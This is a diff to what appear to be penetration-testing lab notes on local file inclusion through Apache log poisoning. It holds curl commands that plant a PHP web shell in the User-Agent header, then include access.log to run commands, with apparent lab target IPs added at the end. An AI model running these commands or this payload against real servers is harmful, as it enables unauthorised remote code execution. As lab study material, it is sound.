@@ -26,7 +26,7 @@ http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
 
 (Control the User-Agent with burp suite or curl)
 ```shell
-curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+curl -s --user-agent '<?php system($_GET["cmd"]); ?>' 'http://<SERVER_IP>:<PORT>/index.php'
 ```
 
 Execute on user-agent web shell
@@ -36,3 +36,8 @@ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.lo
 **Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.
 
 
+
+
+curl -s "http://94.237.54.116:36544/index.php?language=/var/log/apache2/access.log&cmd=pwd"
+
+curl -s 'http://94.237.54.116:58945/index.php' -A '<?php system($_GET["cmd"]); ?>'
